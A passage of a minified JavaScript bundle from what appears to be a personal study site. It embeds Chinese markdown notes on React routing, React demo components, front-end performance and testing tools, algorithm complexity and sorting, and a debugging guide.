数据更新之后的虚拟DOM对象\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/更新后的虚拟DOM对象.png)\n\n## 小结\n\n- 工作角度：应用第一，原理第二\n- 原理有助于更好的理解React的自身运行机制\n- setState() 异步更新数据\n- 父组件更新导致子组件更新，纯组件提升性能\n- 思路清晰简单为前提，虚拟DOM和Diff保效率（渲染变化的组件）\n- 虚拟DOM -> state + JSX\n- 虚拟DOM最大的特点是 脱离了浏览器的束缚，也就是意味着只要是能支持js的地方都可以用到react，所以为什么说react是可以进行跨平台的开发\n\n# React路由基础\n\n## 目标\n\n- 能够说出React路由的作用\n- 能够掌握-react-router-dom的基本使用\n- 能够使用编程式导航跳转路由\n- 能够知道React路由的匹配模式\n\n## React路由介绍\n\n现代的前端应用大多数是SPA（单页应用程序），也就是只有一个HTML页面的应用程序。因为它的用户体验更好、对服务器压力更小，所以更受欢迎。为了有效的使用单个页面来管理多页面的功能，前端路由应运而生。\n\n- 前端路由功能：让用户从一个视图（页面）导航到另一个视图（页面）\n- 前端路由是一套映射规则，在React中，是URL路径与组件的对应关系\n- 使用React路由简单来说，就是配置路径和组件\n\n## 路由的基本使用\n\n### 使用步骤\n\n- 安装： yarn add react-router-dom\n  - 如果没有安装yarn工具的，需要先全局安装一下yarn：npm install -g yarn\n\n- 导入路由的三个核心组件： Router / Route / Link\n\n  ```react\n  import {BrowserRouter as Router, Route, Link} from 'react-router-dom'\n  ```\n\n- 使用Router 组件包裹整个应用\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/Router.png)\n\n- 使用Link组件作为导航菜单（路由入口）\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/link入口.png)\n\n- 使用Route组件配置路由规则和要展示的组件（路由出口）\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/route.png)\n\n### 常用组件说明\n\n- **Router组件：**包裹整个应用，一个React应用只需要使用一次\n  - 两种常用的Router： HashRouter和BrowserRouter\n  - HashRouter： 使用URL的哈希值实现 （localhost:3000/#/first）\n  - 推荐 BrowserRouter：使用H5的history API实现（localhost3000/first）\n- **Link组件：**用于指定导航链接（a标签）\n  - 最终Link会编译成a标签，而to属性会被编译成 a标签的href属性\n- **Route组件：**指定路由展示组件相关信息\n  - path属性：路由规则，这里需要跟Link组件里面to属性的值一致\n  - component属性：展示的组件\n  - Route写在哪，渲染出来的组件就在哪\n\n### 路由的执行过程\n\n- 当我们点击Link组件的时候，修改了浏览器地址栏中的url\n- React路由监听地址栏url的变化\n- React路由内部遍历所有的Route组件，拿着Route里面path规则与pathname进行匹配\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/route匹配.png)\n\n- 当路由规则（path）能够匹配地址栏中的pathname时，就展示该Route组件的内容\n\n### 编程式导航\n\n- **场景：**点击登陆按钮，登陆成功后，通过代码跳转到后台首页，如何实现？\n- **编程式导航：**通过JS代码来实现页面跳转\n- history是React路由提供的，用于获取浏览器历史记录的相关信息\n- **push(path)：**跳转到某个页面，参数path表示要跳转的路径\n- go(n)：前进或后退功能，参数n表示前进或后退页面数量\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/编程式导航.png)\n\n### 默认路由\n\n- 现在的路由都是通过点击导航菜单后展示的，如果进入页面的时候就主动触发路由呢\n- 默认路由：表示进入页面时就会匹配的路由\n- 默认路由：只需要把path设置为 `'/'`\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/默认路由.png)\n\n### 匹配模式\n\n#### 模糊匹配模式\n\n- 当Link组件的to属性值为 '/login' 时候，为什么默认路由也被匹配成功？\n- 默认情况下，React路由是模糊匹配模式\n- 模糊匹配规则：只要pathname以path开头就会匹配成功\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/模糊匹配模式.png)\n\n#### 精准匹配\n\n- 默认路由认可情况下都会展示，如果避免这种问题？\n- 给Route组件添加exact属性，让其变为**精准匹配模式**\n- 精确匹配：只有当path和pathname完全匹配时才会展示改路由\n\n![](./img/web/react/react基础Day04-React原理揭秘&React路由基础/精确匹配.png)\n\n### 小结\n\n- React路由可以有效的管理多个视图实现 SPA\n- 路由先需要通过安装\n- Router组件包裹整个应用，只需要使用一次\n- Link组件是入口，Route组件是出口\n- 通过props.history实现编程式导航\n- 默认是模糊匹配，添加exact编程精确匹配\n- React路由的一切都是组件，可以像思考组件一样思考路由",wi={data:function(){return{MainComponent:_i,MainComponent1:xi}}},Ei=wi,Ti=Object(u["a"])(Ei,yi,fi,!1,null,"29523873",null),ki=Ti.exports,Ci=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ji=[],Mi='\x3c!--\r\n * @Date           : 2021-05-05 14:01:15\r\n * @FilePath       : /jinnian-space/src/pages/web/react/md/react-base-demo.md\r\n * @Description    : \r\n--\x3e\r\n# react 基础 demo\r\n\r\n```react\r\n\r\n/*\r\n * @Date           : 2021-05-05 04:14:10\r\n * @FilePath       : /app-demo-1/src/view/view1.js\r\n * @Description    :\r\n */\r\nimport React from "react";\r\nimport PropTypes from "prop-types";\r\nconst { Provider, Consumer } = React.createContext();\r\nconst el = (\r\n  <div>\r\n    {" "}\r\n    <div>未来很美好 </div>{" "}\r\n  </div>\r\n);\r\nconst Test1 = () => {\r\n  return el;\r\n};\r\nconst classes666 = {\r\n  root: {},\r\n  red: {\r\n    color: "red",\r\n    backgroundColor: "#ccc",\r\n  },\r\n};\r\nconst name1 = "66sxsx999999";\r\nconst div2 = <h3>KKKKKKKKKKKKKK</h3>;\r\nconst list1 = [\r\n  { label: "react", value: "m1" },\r\n  { label: "基础", value: "m2" },\r\n];\r\n// {} 中 不能写 对象表达式 if 等表达式\r\nconst nn = 5;\r\nconst Say1 = (props) => {\r\n  if (nn > 5) {\r\n    return (\r\n      <div>\r\n        大于5 ---- {props.name} ----{props.age}\r\n      </div>\r\n    );\r\n  } else {\r\n    return (\r\n      <div>\r\n        小于等于5 ---- {props.name} ----{props.age}\r\n      </div>\r\n    );\r\n  }\r\n};\r\n// hello 组件\r\nclass Hello extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n  }\r\n  state = {\r\n    num: 1,\r\n    text: "xsx",\r\n  };\r\n  handleClick = () => {\r\n    this.setState({\r\n      num: this.state.num + 1,\r\n    });\r\n    console.log("点击了  class Hello extends React.Component");\r\n  };\r\n  inputChange = (e) => {\r\n    console.log("e", e);\r\n    this.setState({\r\n      text: e.target.value,\r\n    });\r\n  };\r\n  render() {\r\n    return (\r\n      <div>\r\n        <h2 onClick={this.handleClick}> HELLO 类方法 组件 {this.state.num}</h2>\r\n        <div>\r\n          ---- {this.props.name} ----{this.props.age}-----{this.props.age2}----\r\n        </div>\r\n        <div>兄弟组件之间 回调父级传值 {this.props.show_num}</div>\r\n        <input\r\n          type="text"\r\n          value={this.state.text}\r\n          onChange={this.inputChange}\r\n        />\r\n      </div>\r\n    );\r\n  }\r\n}\r\n//类型检测\r\nHello.propTypes = {\r\n  age: PropTypes.number,\r\n};\r\n// 默认值\r\nHello.defaultProps = {\r\n  age2: 188,\r\n};\r\n// hello2 子组件\r\nconst Hello2SubChild = (props) => {\r\n  return (\r\n    <div>\r\n      <div>Hello2 组件的子组件---</div>\r\n      <Consumer>{(data) => <span>跨多级传值 接收到的{data}</span>}</Consumer>\r\n      <div>{props.children}</div>\r\n    </div>\r\n  );\r\n};\r\n// hello2 组件\r\nclass Hello2 extends React.Component {\r\n  handleClick() {\r\n    console.log("点击了");\r\n  }\r\n  render() {\r\n    return (\r\n      <div>\r\n        <div onClick={this.handleClick}>单独抽离出来的 Hello</div>\r\n        <button onClick={this.props.change_father_num}>\r\n          兄弟组件之间传值 调用父级 传入得函数 ，改变父级的state\r\n        </button>\r\n        <div>\r\n          <Hello2SubChild>\r\n            {" "}\r\n            <h3>Hello2SubChild 组件 通过 children 传递的 子节点</h3>{" "}\r\n          </Hello2SubChild>\r\n        </div>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nclass Hello3 extends React.Component{\r\n  constructor(props){\r\n    super(props)\r\n  }\r\n  state={\r\n    name:\'HELLO3 组件 render props 共享值，高阶组件复用\'\r\n  }\r\n  render(){\r\n    return this.props.render(this.state)\r\n\r\n  }\r\n}\r\n\r\nconst handleClick2 = (e) => {\r\n  console.log("e", e);\r\n  console.log("点击了函数组件 事件");\r\n};\r\nclass View1 extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n    console.log("生命周期  constructor");\r\n  }\r\n  componentWillUnmount() {\r\n    console.log("生命周期  componentWillUnmount");\r\n  }\r\n  componentDidUpdate() {\r\n    console.log("生命周期  componentDidUpdate");\r\n  }\r\n  componentWillUnmount() {\r\n    console.log("生命周期  componentWillUnmount");\r\n  }\r\n  state = {\r\n    father_num: 6,\r\n  };\r\n  handleChangeFatherNum = () => {\r\n    this.setState({\r\n      father_num: this.state.father_num + 1,\r\n    });\r\n  };\r\n  render() {\r\n    console.log("生命周期    render");\r\n    return (\r\n      <Provider value="跨多级 子节点 传递 数值">\r\n        <div>\r\n          <h1 className="classesxsx666" onClick={handleClick2}>\r\n            我 {name1} 带你.......{classes666.red.color}...........\r\n          </h1>\r\n          <div>\r\n            <Say1 name="今年" age={89} />\r\n          </div>\r\n          <div>{div2}</div>\r\n          <Test1 />\r\n          <div style={classes666.red}>\r\n            {list1.map((x) => (\r\n              <div key={x.label}>\r\n                {x.label}----------{x.value}\r\n              </div>\r\n            ))}\r\n          </div>\r\n          <div>\r\n            <Hello name="明天" age={39} show_num={this.state.father_num} />\r\n            <Hello2 change_father_num={this.handleChangeFatherNum} />\r\n            <Hello3 render={ data=><p>拿到的复用数据----- {data.name} </p>} />\r\n          </div>\r\n          \r\n         \r\n        </div>\r\n      </Provider>\r\n    );\r\n  }\r\n}\r\nexport default View1;\r\n\r\n\r\n\r\n```\r\n\r\n## 高阶组件\r\n\r\n```react\r\n/*\r\n * @Date           : 2021-05-05 22:49:51\r\n * @FilePath       : /app-demo-1/src/view/Demo.js\r\n * @Description    : \r\n */\r\nimport React from \'react\'\r\nimport ReactDOM from \'react-dom\'\r\n/* \r\n  高阶组件\r\n*/\r\n// 创建高阶组件\r\nfunction withMouse(WrappedComponent) {\r\n  // 该组件提供复用的状态逻辑\r\n  class Mouse extends React.Component {\r\n    // 鼠标状态\r\n    state = {\r\n      x: 0,\r\n      y: 0\r\n    }\r\n    handleMouseMove = e => {\r\n      this.setState({\r\n        x: e.clientX,\r\n        y: e.clientY\r\n      })\r\n    }\r\n    // 控制鼠标状态的逻辑\r\n    componentDidMount() {\r\n      window.addEventListener(\'mousemove\', this.handleMouseMove)\r\n    }\r\n    componentWillUnmount() {\r\n      window.removeEventListener(\'mousemove\', this.handleMouseMove)\r\n    }\r\n    render() {\r\n      console.log(\'Mouse:\', this.props)\r\n      return <WrappedComponent {...this.state} {...this.props} />\r\n    }\r\n  }\r\n  // 设置displayName\r\n  Mouse.displayName = `WithMouse${getDisplayName(WrappedComponent)}`\r\n  return Mouse\r\n}\r\nfunction getDisplayName(WrappedComponent) {\r\n  return WrappedComponent.displayName || WrappedComponent.name || \'Component\'\r\n}\r\n// 用来测试高阶组件\r\nconst Position = props => {\r\n  console.log(\'Position:\', props)\r\n  return (\r\n    <p>\r\n      鼠标当前位置：(x: {props.x}, y: {props.y})\r\n    </p>\r\n  )\r\n}\r\n// 获取增强后的组件：\r\nconst MousePosition = withMouse(Position)\r\nclass App extends React.Component {\r\n  render() {\r\n    return (\r\n      <div>\r\n        <h1>高阶组件</h1>\r\n        <MousePosition a="1" />\r\n      </div>\r\n    )\r\n  }\r\n}\r\nReactDOM.render(<App />, document.getElementById(\'root\'))\r\n\r\n\r\n```',Ri={data:function(){return{MainComponent:Mi}}},Li=Ri,Oi=Object(u["a"])(Li,Ci,ji,!1,null,"98ecbc0c",null),Ai=Oi.exports,Ii=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"row   "},[t("q-select",{attrs:{"use-input":"","input-debounce":"0",clearable:"",options:n.book_options},on:{filter:n.filterFn},model:{value:n.book,callback:function(r){n.book=r},expression:"book"}},[t("template",{slot:"before"},[t("div")])],2)],1),t("div",{staticClass:"q-pdfviewer-container  "},[t("q-pdfviewer",{attrs:{src:n.src,type:"html5","content-class":" fit   q-pdfviewer-container","inner-content-class":" fit   q-pdfviewer-container"},model:{value:n.show,callback:function(r){n.show=r},expression:"show"}})],1)])},Di=[],Pi=["01_.pdf","02_03_04_JSX核心语法.pdf","05_React脚手架.pdf","06_07_08__09_10_React组件化开发.pdf","11_React的CSS.pdf","12_AntDesignUI库.pdf","13_axios的使用.pdf","14_React过渡动画.pdf","15_16_17_Redux的使用.pdf","18_19_React-router的使用.pdf","20_21_22_React-Hooks.pdf","23_24_网易云项目实战.pdf","30_React-SSR.pdf","项目自动化部署.pdf"],Ni="react/react核心精讲/",qi={mixins:[xn["b"]],data:function(){return{prefix:Ni,book_options:Pi,show:!0,book:Pi[0],src:""}}},Hi=qi,Bi=Object(u["a"])(Hi,Ii,Di,!1,null,null,null),Fi=Bi.exports,Ui={mixins:[xn["a"]],components:{m1:pi,m2:Si,m3:ki,m4:Ai,m5:Fi},data:function(){return{tab:"m3",tab_level:2,tabs:[{label:"react",value:"m1"},{label:"基础",value:"m2"},{label:"基础",value:"m3"},{label:"基础demo",value:"m4"},{label:"核心精讲",value:"m5"}]}}},Ji=Ui,zi=Object(u["a"])(Ji,ti,ei,!1,null,"47814e99",null),Wi=zi.exports,$i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},Gi=[],Vi=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},Qi=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("article",{staticClass:"post"},[t("header",{staticClass:"post-header"},[t("h4",{staticClass:"post-title"},[n._v("\n        前端测试、性能监测、自动化集成方案\n      ")])]),t("div",{staticClass:"post-body"},[t("h5",{attrs:{id:"一、前端性能监测方案"}},[t("a",{staticClass:"headerlink",attrs:{href:"#一、前端性能监测方案",title:"一、前端性能监测方案"}}),n._v("一、前端性能监测方案\n      ")]),t("p",[t("strong",[n._v("性能监测：")])]),t("ol",[t("li",[t("p",[t("strong",[n._v("chrome 的 performance：")]),t("br"),n._v("DNS 查询耗时\n            ：domainLookupEnd - domainLookupStart"),t("br"),n._v("TCP 链接耗时\n            ：connectEnd - connectStart\n          ")]),t("p",[n._v("\n            request 请求耗时 ：responseEnd - responseStart"),t("br"),n._v("解析 dom\n            树耗时 ： domComplete - domInteractive"),t("br"),n._v("白屏时间\n            ：responseStart - navigationStart"),t("br"),n._v("domready\n            时间(用户可操作时间节点) ：domContentLoadedEventEnd -\n            navigationStart"),t("br"),n._v("onload 时间(总下载时间) ：loadEventEnd -\n            navigationStart"),t("br"),n._v("获取所有资源请求的时间数据,这个函数返回一个按\n            startTime 排序的对象数组 getEntries: ƒ getEntries()\n          ")])]),t("li",[t("p",[t("strong",[n._v("Google 的 Lighthouse 插件")])])]),t("li",[t("p",[t("strong",[n._v("网页性能测试分析工具-PageSpeed Insights （插件）、Page Speed\n              Online（网页）")]),t("br"),n._v("Pagespeed 测试工具出自\n            google，通过分析网页的内容来提供网站加载速度优化建议。PageSpeed\n            Insights 是一款可以分析网页打开速度的谷歌浏览器插件，通过\n            PageSpeed Insights\n            插件的分析并给出相应的优化建议，网站开发人员可以找出网站速度的瓶颈所在，并相应的网站优化，带给用户更好的用户体验。\n          ")])]),t("li",[t("p",[t("strong",[n._v("Yslow")])])]),t("li",[t("p",[t("strong",[n._v("Pingdom：")]),n._v("测试网站所有对象的加载时间（HTML，images，JavaScript，CSS，嵌入式框架等）。\n            您还可以检查网站每个元素的加载速度并改善加载缓慢的项目。\n            在测试结果中，可以看到网站每个元素的加载时间报告，元素的大小和元素的总数量。\n          ")])]),t("li",[t("p",[t("strong",[n._v("GTmetrix：")]),n._v("结合了最流行的 Firefox 性能组件 YSlow\n            的和谷歌网页速度测试工具。 Gtmetrix\n            给你提供改进网站速度的建议，虽然 YSlow\n            的和谷歌网页的速度测试的建议是针对 Firefox\n            的，也可以适用于其他浏览器。\n          ")])]),t("li",[t("p",[t("strong",[n._v("Light Speed Now")]),t("br"),n._v("测试你的网站的速度性能，并把测试报告发送给到你的邮箱。\n          ")])]),t("li",[t("p",[t("strong",[n._v("Load Impact")]),t("br"),n._v("Loadimpact\n            对于一个每天有成千上万的游客访问的大型网站来说是个非常重要的工具。\n            一个免费帐户允许你模拟 50\n            个用户访问的压力测试，还要更多的话你就必须升级高级账号。\n          ")])]),t("li",[t("p",[t("strong",[n._v("Site-Perf")]),t("br"),n._v("它模拟浏览器下载图片，CSS，JS\n            和其他文件，在报告中你可以看到先加载网站的哪些页以及加载时间。\n            这是十分有用的性能报告，可以用来查找到提高你的网站的载入速度需要改善的元素。\n          ")])])]),t("h5",{attrs:{id:"二、前端单元测试和持续集成"}},[t("a",{staticClass:"headerlink",attrs:{href:"#二、前端单元测试和持续集成",title:"二、前端单元测试和持续集成"}}),n._v("二、前端单元测试和持续集成\n      ")]),t("p",[n._v("一个测试体系大体应该包含四部分")]),t("ul",[t("li",[n._v("测试运行器 Test Runner: edp-test karma")]),t("li",[n._v("测试框架 Testing Framework: jasmine mocha qunit Jest")]),t("li",[n._v("断言库 Assertion library: expect.js should chai")]),t("li",[n._v("覆盖率 Coverage library: istanbul")])]),t("p",[t("strong",[n._v("Mocha/Karma+Travis.CI 的前端测试工作流")])]),t("ol",[t("li",[t("strong",[n._v("mocha")]),n._v("\n          是一个功能丰富的前端测试框架。所谓”测试框架”，就是运行测试的工具。通过它，可以为\n          JavaScript 应用添加测试，从而保证代码的质量。mocha 既可以基于\n          Node.js 环境运行\n          也可以在浏览器环境运行。欲了解更多可去官方网站进行学习。\n        ")]),t("li",[t("strong",[n._v("Karma")]),n._v("：一个基于 Node.js 的 JavaScript\n          测试执行过程管理工具（Test Runner）。该工具可用于测试所有主流 Web\n          浏览器，也可集成到 CI（Continuous\n          integration）工具，也可和其他代码编辑器一起使用。这个测试工具的一个强大特性就是，它可以监控文件的变化，然后自行执行，通过\n          console.log 显示测试结果。Karma\n          的一个强大特性就是，它可以监控一套文件的变换，并立即开始测试已保存的文件，用户无需离开文本编辑器。测试结果通常显示在命令行中，而非代码编辑器。这也就让\n          Karma 基本可以和任何 JS 编辑器一起使用。\n        ")]),t("li",[t("strong",[n._v("Travis.CI:")]),n._v(" 提供的是持续集成服务（Continuous\n          Integration，简称 CI）。它绑定 Github\n          上面的项目，只要有新的代码，就会自动抓取。然后，提供一个运行环境，执行测试，完成构建，还能部署到服务器。\n        ")])])]),t("footer",{staticClass:"post-footer"},[t("div",{staticClass:"post-tags"}),t("div",{staticClass:"post-nav"},[t("div",{staticClass:"post-nav-next post-nav-item"},[t("i",{staticClass:"fa fa-chevron-left"}),t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/11/03/5dbe6b5ecbdd4/",rel:"next"}},[n._v("Hexo")])]),t("div",{staticClass:"post-nav-prev post-nav-item"},[t("a",{attrs:{href:"https://www.dazhuanlan.com/2019/11/03/5dbe6b271cc66/",rel:"prev"}},[n._v("源码看JAVA【二十九】AtomicLong")]),t("i",{staticClass:"fa fa-chevron-right"})])])]),t("div",{attrs:{id:"crp_related"}})])])}],Ki={},Xi=Ki,Yi=Object(u["a"])(Xi,Vi,Qi,!1,null,"39a79fd2",null),Zi=Yi.exports,ns=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},rs=[],ts='# 算法\r\n\r\n## 什么是时间复杂度\r\n\r\n### （1）语句频度\r\n\r\n- 算法就是你解决问题的方法，而你用这个方法解决这个问题所执行的语句次数，称为语句频度或者时间频度，记为T(n)。\r\n- 在上面提到的时间频度T(n)中，n是指算法的规模，n不断的变化，T(n)就会不断的变化，而这些变化的规律是怎样的呢？于是我们引入了时间复杂度的概念。\r\n\r\n### （2）时间复杂度\r\n\r\n- 算法中某个函数有n次基本操作重复执行，用T(n)表示，现在有某个辅助函数f(n),使得当n趋近于无穷大时，T（n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n)),称O(f(n)) 为算法的渐进时间复杂度，简称时间复杂度。通俗一点讲，其实所谓的时间复杂度，就是找了一个同样曲线类型的函数f(n)来表示这个算法的在n不断变大时的趋势 。当输入量n逐渐加大时，时间复杂性的极限情形称为算法的“渐近时间复杂性”。 \r\n\r\n### （3）大O记法\r\n\r\n- 在这种描述中使用的基本参数是 n，即问题实例的规模，把复杂性或运行时间表达为n的函数。这里的“O”表示量级 (order)，比如说“二分检索是 O(logn)的”,也就是说它需要“通过logn量级的步骤去检索一个规模为n的数组”记法 O ( f(n) )表示当 n增大时，运行时间至多将以正比于 f(n)的速度增长。 \r\n\r\n### （4）简单算法的时间复杂度举例\r\n\r\n- O(1)的算法是一些运算次数为常数的算法。\r\n\r\n\t- 例如：temp=a;a=b;b=temp;\r\n\t- 上面语句共三条操作，单条操作的频度为1，即使他有成千上万条操作，也只是个较大常数，这一类的时间复杂度为O(1)。\r\n\r\n- O(n)的算法是一些线性算法。\r\n\r\n\t- sum=0；                 \r\nfor(i=0;i<n;i++)       \r\nsum++；\r\n\t- 上面代码中第一行频度1，第二行频度为n，第三行频度为n，所以f(n)=n+n+1=2n+1。所以时间复杂度O(n)。这一类算法中操作次数和n正比线性增长。\r\n\r\n- O(logn) 一个算法如果能在每个步骤去掉一半数据元素，如二分检索，通常它就取 O(logn)时间。\r\n\r\n\t- int i=1; \r\nwhile (i<=n) \r\ni=i*2; \r\n\t- 上面代码设第三行的频度是f(n),   则：2的f(n)次方<=n;f(n)<=log₂n，取最大值f(n)= log₂n，所以T(n)=O(log₂n ) 。\r\n\r\n- O(n²)（n的k次方的情况）最常见的就是平时的对数组进行排序的各种简单算法都是O(n²)，例如直接插入排序的算法。而像矩阵相乘算法运算则是O(n³)。\r\n\r\n\t- sum=0；                \r\nfor(i=0;i<n;i++)  \r\n  for(j=0;j<n;j++) \r\n    sum++；\r\n\t- 第一行频度1，第二行n，第三行n²，第四行n²，T(n)=2n²+n+1 =O(n²)\r\n\r\n- O(2的n次方) 比如求具有n个元素集合的所有子集的算法 \r\n- O(n!) 比如求具有N个元素的全排列的算法\r\n\r\n### （5）时间复杂度按n越大算法越复杂来排\r\n\r\n- 常数阶O(1)、对数阶O(logn)、线性阶O(n)、线性对数阶O(nlogn)、平方阶O(n²)、立方阶O(n³)、……k次方阶O(n的k次方)、指数阶O(2的n次方)。\r\n\r\n### （6）最坏情况的时间和期望时间\r\n\r\n- 比如说快速排序，最坏情况运行时间是 O(n²)，但期望时间是O(nlogn)。但是我们只要通过一些手段，可以避免最坏情况发生，所以在实际情况中，精心设计的快速排序都能以期望时间运行。\r\n\r\n## 【栈，队列，链表】用JavaScript实现\r\n\r\n### 栈\r\n\r\n- 栈的特点是只能在某一端添加或删除数据，遵循先进后出的原则\r\n- 实现\r\n\r\n### 队列\r\n\r\n- 队列一个线性结构，特点是在某一端添加数据，在另一端删除数据，遵循先进先出的原则。\r\n- 实现\r\n\r\n\t- 单链队列\r\n\r\n\t- 循环队列\r\n\r\n\t\t- 因为单链队列在出队操作的时候需要 O(n) 的时间复杂度，所以引入了循环队列。循环队列的出队操作平均是 O(1) 的时间复杂度。\r\n### 链表\r\n\r\n- 头节点\r\n\r\n- 插入节点\r\n\r\n- 删除节点\r\n\r\n- 链表的设计（简易版）\r\n\r\n\t- 单向链表\r\n\r\n\t\t- 我们设计链表包含两个类，一个是 Node 类用来表示节点，另一个事 LinkedList 类提供插入节点、删除节点等一些操作。\r\n\t\t- Node类\r\n\r\n\t\t\t- Node类包含两个属性： element 用来保存节点上的数据，next 用来保存指向下一个节点的链接\r\n\t\t- LinkedList类\r\n\r\n\t\t\t- LinkedList类提供了对链表进行操作的方法，包括插入删除节点，查找给定的值等。值得注意的是，它只有一个 属性，那就是使用一个 Node 对象来保存该链表的头节点。\r\n\t\t- 具体方法的实现\r\n\r\n\t\t\t- find：查找给定节点\r\n\r\n\t\t\t- insert：向链表插入一个节点\r\n\r\n\t\t\t- display：显示链表\r\n\r\n\t\t\t- remove：从链表中删除一个节点\r\n\r\n\t\t\t\t- 从链表中删除节点时，我们先要找个待删除节点的前一个节点，找到后，我们修改它的 next 属性，使其不在指向待删除的节点，而是待删除节点的下一个节点。那么，我们就得需要定义一个 findPrevious 方法遍历链表，检查每一个节点的下一个节点是否存储待删除的数据。如果找到，返回该节点，这样就可以修改它的 next 属性了。 \r\n\t- 双向链表\r\n\r\n\t- 循环链表\r\n\r\n\t\t- 循环链表和单链表相似，节点类型都是一样，唯一的区别是，在创建循环链表的时候，让其头节点的 next 属性执行它本身，即，head.next = head;\r\n\t\t- 这种行为会导致链表中每个节点的 next 属性都指向链表的头节点，换句话说，也就是链表的尾节点指向了头节点，形成了一个循环链表\r\n## 【排序算法】优雅的 JAVASCRIPT 排序算法（ES6）\r\n\r\n### 总结\r\n\r\n- 名词解释\r\n\r\n\t- n: 数据规模\r\n\t- k:“桶”的个数\r\n\t- In-place: 占用常数内存，不占用额外内存\r\n\t- Out-place: 占用额外内存\r\n\t- 稳定性：排序后2个相等键值的顺序和排序之前它们的顺序相同\r\n\r\n\t\t- 1、堆排序、快速排序、希尔排序、直接选择排序不是稳定的排序算法；\r\n\t\t- 2、基数排序、冒泡排序、直接插入排序、折半插入排序、归并排序是稳定的排序算法。\r\n\t\t- 稳定排序在给定相同输入时具有确定性输出，这对于调试和测试可能很重要。\r\n\r\n### 冒泡排序（Bubble Sort）\r\n\r\n- 须知\r\n\r\n\t- 还有一种优化算法，就是立一个flag，当在一趟序列遍历中元素没有发生交换，则证明该序列已经有序。\r\n\r\n- 工作原理\r\n\r\n\t- （1）比较相邻的元素。如果第一个比第二个大，就交换他们两个。\r\n\t- （2）对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。\r\n\t- （3）针对所有的元素重复以上的步骤，除了最后一个。\r\n\t- （4）持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。\r\n\r\n- 什么时候最快（Best Cases）：\r\n\r\n\t- 当输入的数据已经是正序时\r\n\r\n- 什么时候最慢（Worst Cases）：\r\n\r\n\t- 当输入的数据是反序时\r\n\r\n- JavaScript代码\r\n\r\n### 选择排序（Selection Sort）\r\n\r\n- 须知\r\n\r\n\t- 在时间复杂度上表现最稳定的排序算法之一，因为无论什么数据进去都是O(n²)的时间复杂度。。。所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。\r\n\r\n- 工作原理\r\n\r\n\t- 首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。\r\n\r\n- JavaScript代码\r\n\r\n### 插入排序（Insertion Sort）\r\n\r\n- 须知\r\n\r\n\t- 插入排序的原理应该是最容易理解的了，因为只要打过扑克牌的人都应该能够秒懂。\r\n\t- 插入排序和冒泡排序一样，也有一种优化算法，叫做拆半插入。\r\n\r\n- 工作原理\r\n\r\n\t- （1）从第一个元素开始，该元素可以认为已经被排序\r\n\t- （2）取出下一个元素，在已经排序的元素序列中从后向前扫描\r\n\t- （3）如果该元素（已排序）大于新元素，将该元素移到下一位置\r\n\t- （4）重复步骤3，直到找到已排序的元素小于或者等于新元素的位置\r\n\t- （5）将新元素插入到该位置后\r\n\t- （6）重复步骤2~5\r\n\r\n- JavaScript代码\r\n\r\n### 快速排序（Quick Sort）\r\n\r\n- 须知\r\n\r\n\t- 又是一种分而治之思想在排序算法上的典型应用。本质上来看，快速排序应该算是在冒泡排序基础上的递归分治法。\r\n\r\n- 原理\r\n\r\n\t- （1）在数据集之中，选择一个元素作为"基准"（pivot）。\r\n\t- （2）所有小于"基准"的元素，都移到"基准"的左边；所有大于"基准"的元素，都移到"基准"的右边。\r\n\t- （3）对"基准"左边和右边的两个子集，不断重复第一步和第二步，直到所有子集只剩下一个元素为止。\r\n\t- 理解此版本的核心函数（分区并返回基准下标的函数）\r\n\r\n\t\t- 即除首项（left先做基准值）后面的所有项依次与首项基准值作比较，注意如果不大于基准值的话，i会持续增加，而index不会，所以找到比基准值小的项时，就让它的位置i与之前记录的index（此时index为最早发现的大于基准值的下标）交换，以此操作遍历完数组，最后在将，基准值与大小区分界的小数交换，即可完成分区\r\n\r\n- JavaScript代码\r\n\r\n',es={data:function(){return{MainComponent:ts}}},as=es,is=Object(u["a"])(as,ns,rs,!1,null,"0a186b81",null),ss=is.exports,os=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},ls=[],cs="# 调试\r\n\r\n## 调试9法\r\n\r\n### 1、理解系统\r\n\r\n- 阅读手册\r\n\r\n\t- 除草机温度过高，未通读手册\r\n\r\n- 逐字逐句阅读 整个手册\r\n\r\n\t- 因为有的关键信息正好可能被你遗漏了\r\n\r\n- 查阅手册\r\n\r\n\t- 有些东西不要凭自己的记忆，要翻阅资料进行确认\r\n\r\n- 知道什么是正常的\r\n\r\n\t- 知道什么是正常的 会帮助你注意什么不是正常的   还有基础知识很关键，手册是假定你知道某些基础知识的\r\n\r\n- 知道工作流程\r\n\r\n\t- 知道系统的整个架构及各个模块或环节的工作流程\r\n\r\n- 了解你的工具，包括工具的局限性\r\n\r\n\t- 调试工具\r\n\t- 开发工具\r\n\t- 